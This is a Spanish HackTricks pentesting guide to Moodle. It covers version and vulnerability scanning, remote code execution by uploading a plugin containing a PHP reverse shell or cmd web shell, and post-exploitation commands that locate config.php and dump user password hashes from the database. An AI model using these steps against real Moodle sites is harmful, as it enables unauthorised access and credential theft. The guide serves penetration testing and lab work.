# Moodle

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si estÃ¡s interesado en una **carrera de hacking** y en hackear lo imposible - Â¡estamos contratando! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Escaneos automÃ¡ticos

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:                                                              
    forum http://moodle.schooled.htb/moodle/mod/forum/
        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
        http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
    3.10.0-beta

[+] Possible interesting urls found:
    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
    Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

moodlescan es una herramienta de escaneo de vulnerabilidades especÃ­fica para Moodle, una plataforma de aprendizaje en lÃ­nea. Esta herramienta puede ayudar a identificar vulnerabilidades comunes en una instalaciÃ³n de Moodle, como la exposiciÃ³n de informaciÃ³n confidencial, la ejecuciÃ³n de cÃ³digo remoto y la inyecciÃ³n de SQL.

Para utilizar moodlescan, primero debemos proporcionar la URL de la instalaciÃ³n de Moodle que deseamos escanear. Luego, la herramienta realizarÃ¡ una serie de pruebas automatizadas para identificar posibles vulnerabilidades. Es importante tener en cuenta que moodlescan no es una herramienta de explotaciÃ³n, sino que se utiliza para identificar posibles vulnerabilidades que luego pueden ser explotadas por un atacante.

Algunas de las pruebas que realiza moodlescan incluyen la identificaciÃ³n de archivos de configuraciÃ³n expuestos, la verificaciÃ³n de la versiÃ³n de Moodle instalada y la bÃºsqueda de vulnerabilidades conocidas en esa versiÃ³n. TambiÃ©n puede realizar pruebas de inyecciÃ³n de SQL y XSS en formularios y parÃ¡metros de URL.

Es importante tener en cuenta que moodlescan no es una herramienta completa de evaluaciÃ³n de vulnerabilidades y no debe ser la Ãºnica herramienta utilizada para evaluar la seguridad de una instalaciÃ³n de Moodle. Sin embargo, puede ser una herramienta Ãºtil para identificar posibles vulnerabilidades y ayudar a los administradores de Moodle a tomar medidas para proteger su plataforma.
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl
	
.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

CMSMap es una herramienta de cÃ³digo abierto que se utiliza para escanear sitios web y encontrar la versiÃ³n del CMS que se estÃ¡ utilizando. TambiÃ©n puede encontrar vulnerabilidades conocidas en el CMS y enumerar los usuarios y sus roles. CMSMap es compatible con varios CMS, incluyendo Moodle. 

Para escanear un sitio web con CMSMap, simplemente ejecute el siguiente comando:

```
cmsmap.py -t <URL>
```

Donde `<URL>` es la URL del sitio web que desea escanear. CMSMap tambiÃ©n tiene varias opciones adicionales que se pueden utilizar para personalizar el escaneo.
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

EncontrÃ© que las herramientas automÃ¡ticas son bastante **inÃºtiles para encontrar vulnerabilidades que afecten a la versiÃ³n de Moodle**. Puedes **verificar** si existen en [**https://snyk.io/vuln/composer:moodle%2Fmoodle**](https://snyk.io/vuln/composer:moodle%2Fmoodle)

## **RCE**

Necesitas tener el rol de **manager** y **puedes instalar plugins** dentro de la pestaÃ±a de **"AdministraciÃ³n del sitio"**:

![](<../../.gitbook/assets/image (447).png>)

Si eres manager, es posible que aÃºn necesites **activar esta opciÃ³n**. Puedes ver cÃ³mo hacerlo en el PoC de escalada de privilegios de Moodle: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

Luego, puedes **instalar el siguiente plugin** que contiene el clÃ¡sico shell reverso php de pentest-monkey (_antes de subirlo, necesitas descomprimirlo, cambiar la IP y el puerto del revshell y comprimirlo de nuevo_)

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

O puedes usar el plugin de [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE) para obtener un shell PHP regular con el parÃ¡metro "cmd".

Para acceder y lanzar el plugin malicioso, necesitas acceder a:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### Encontrar credenciales de la base de datos
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### Volcado de credenciales desde la base de datos
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="original">

Si estÃ¡s interesado en una **carrera de hacking** y en hackear lo imposible, Â¡**estamos contratando!** (_se requiere fluidez en polaco, tanto hablado como escrito_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme en Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
